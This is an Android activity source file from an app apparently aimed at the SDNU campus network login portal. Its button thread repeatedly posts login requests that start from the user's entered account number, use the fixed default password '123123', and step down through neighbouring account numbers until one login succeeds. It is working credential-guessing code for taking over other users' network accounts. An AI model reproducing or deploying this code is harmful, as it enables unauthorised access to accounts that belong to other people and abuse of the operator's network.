package com.solveit.sdnu;

import android.app.FragmentManager;
import android.app.FragmentTransaction;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.snackbar.Snackbar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.EditText;
import android.widget.Toast;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import java.math.BigInteger;
import java.util.Map;

import com.google.android.gms.ads.MobileAds;
import com.google.android.gms.ads.initialization.InitializationStatus;
import com.google.android.gms.ads.initialization.OnInitializationCompleteListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;


@SuppressWarnings("ALL")
public class ScrollingActivity extends AppCompatActivity {
    public static Context SContext;
    private AdView mAdView;

    Setting myset = new Setting();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SContext = getApplicationContext();
        setContentView(R.layout.activity_scrolling);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);


        MobileAds.initialize(this, new OnInitializationCompleteListener() {
            @Override
            public void onInitializationComplete(InitializationStatus initializationStatus) {
            }
        });

        mAdView = findViewById(R.id.adView);
        AdRequest adRequest = new AdRequest.Builder().build();
        mAdView.loadAd(adRequest);

        findViewById(R.id.action_settings);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Runing", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
                new Thread(runnable).start();
            }
        });
    }


    public void toSetting(){
            //去下载页面
        FragmentManager fragmentManager = getFragmentManager();
        FragmentTransaction transaction = fragmentManager.beginTransaction();
        transaction.add(R.id.action_settings, myset).commit();
    }

    MyHandler handler = new MyHandler();

    Runnable runnable = new Runnable(){
        @Override
        public void run() {
            final String url = "http://192.168.255.195:8080/Control?id=2000";
            final String post = "http://192.168.255.195:8080/Control?id=1000";
            String USER_AGENT = "User-Agent";
            String USER_AGENT_VALUE = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
            EditText Phone = findViewById(R.id.PhoneNum);
            BigInteger user = new BigInteger(Phone.getText().toString()), need = new BigInteger("1");
            Map<String, String> cookies;
            //Map<String, String> Data = new HashMap<String, String>();
            Message err = new Message();
            err.what = 12;
            //err.obj = "here";
            try {
                while (true) {
                    Connection pos = Jsoup.connect(post)
                            .header(USER_AGENT, USER_AGENT_VALUE)
                            .data("strAccount", user.toString())
                            .data("strPassword", "123123")
                            .data("savePWD", "1")
                            .data("id", "2000")
                            .method(Connection.Method.POST);
                    Connection.Response re = pos.execute();
                    re.cookies();
                    Connection get = Jsoup.connect(url)
                            .header(USER_AGENT, USER_AGENT_VALUE)
                            .data("strAccount", user.toString())
                            .data("strPassword", "123123")
                            .data("savePWD", "1")
                            .data("id", "2000")
                            .referrer(post)
                            .cookies(re.cookies())
                            .method(Connection.Method.GET);

                    Document doc = get.get();
                    //err.obj = doc.toString();
                    //handler.sendMessage(err);
                    Elements fin = doc.select("td[align=center]");

                    String aim = fin.toString();

                    if(aim.contains("成功") || aim.contains("ACK_AUTH"))break;
                    else  user = user.subtract(need);
                    //Message wa = new Message();
                    //wa.what = 7;
                    //wa.obj = aim.concat(user.toString());
                    //handler.sendMessage(wa);
                }
                handler.sendEmptyMessage(0);
            }
            catch (Exception e) {
                handler.sendEmptyMessage(1);
            }
        }
    };

    static class MyHandler extends  Handler {
        //WeakReference<ScrollingActivity> mWeakReference;
        //MyHandler(ScrollingActivity activity)
        //{
        //    mWeakReference = new WeakReference<ScrollingActivity>(activity);
        //}
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            //mWeakReference.get().todo();
            if(msg.what == 0){
                Log.e("handleMessage: ", "win");
                Toast tt = Toast.makeText(ScrollingActivity.SContext, "Solve it.", Toast.LENGTH_SHORT);
                tt.show();
            }
            else if(msg.what == 1){
                Toast tt = Toast.makeText(ScrollingActivity.SContext, "You really connect SDNU??\n请检查是否给予网络权限及是否连接sdnu", Toast.LENGTH_SHORT);
                tt.show();
            }
            else  {
                //Log.e("handleMessage: ", "fault");
                Toast tt = Toast.makeText(ScrollingActivity.SContext, msg.obj.toString(), Toast.LENGTH_SHORT);
                tt.show();
            }
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_scrolling, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        /*
        Handle action bar item clicks here. The action bar will
        automatically handle clicks on the Home/Up button, so long
        as you specify a parent activity in AndroidManifest.xml.
        */
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {

            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
